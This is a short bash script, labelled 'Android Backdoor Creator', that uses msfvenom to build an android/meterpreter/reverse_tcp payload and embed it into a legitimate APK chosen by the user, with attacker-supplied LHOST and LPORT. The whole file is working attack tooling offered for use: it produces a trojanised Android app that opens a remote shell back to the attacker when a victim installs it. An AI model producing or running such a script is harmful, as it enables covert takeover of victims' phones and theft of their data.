#!/bin/bash

# Function to display script usage
#echo "

                     _           _     _   ____             _       _                   _____                _            
     /\             | |         (_)   | | |  _ \           | |     | |                 / ____|              | |           
    /  \   _ __   __| |_ __ ___  _  __| | | |_) | __ _  ___| | ____| | ___   ___  _ __| |     _ __ ___  __ _| |_ ___ _ __ 
   / /\ \ | '_ \ / _` | '__/ _ \| |/ _` | |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__| |    | '__/ _ \/ _` | __/ _ \ '__|
  / ____ \| | | | (_| | | | (_) | | (_| | | |_) | (_| | (__|   < (_| | (_) | (_) | |  | |____| | |  __/ (_| | ||  __/ |   
 /_/    \_\_| |_|\__,_|_|  \___/|_|\__,_| |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   \_____|_|  \___|\__,_|\__\___|_|   
                                      ______                                     ______                                   
                                     |______|                                   |______|                                  
                                                                                               Made+by+Darkdevil



"

usage() {
    echo "Usage: $0 -a input_apk_file -u output_apk_file -l LHOST -p LPORT"
    exit 1
}

# Parse command line options
while getopts ":a:u:l:p:" opt; do
    case ${opt} in
        a )
            input_apk=$OPTARG
            ;;
        u )
            output_apk=$OPTARG
            ;;
        l )
            LHOST=$OPTARG
            ;;
        p )
            LPORT=$OPTARG
            ;;
        \? )
            echo "Invalid option: $OPTARG" 1>&2
            usage
            ;;
        : )
            echo "Invalid option: $OPTARG requires an argument" 1>&2
            usage
            ;;
    esac
done
shift $((OPTIND -1))

# Check if all required options are provided
if [ -z "$input_apk" ] || [ -z "$output_apk" ] || [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
    usage
fi

# Generate payload using msfvenom
echo "Generating Meterpreter reverse TCP payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o payload.apk

# Embed payload into input APK
echo "Embedding payload into $input_apk and saving as $output_apk..."
msfvenom -x "$input_apk" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "$output_apk"

echo "Done"

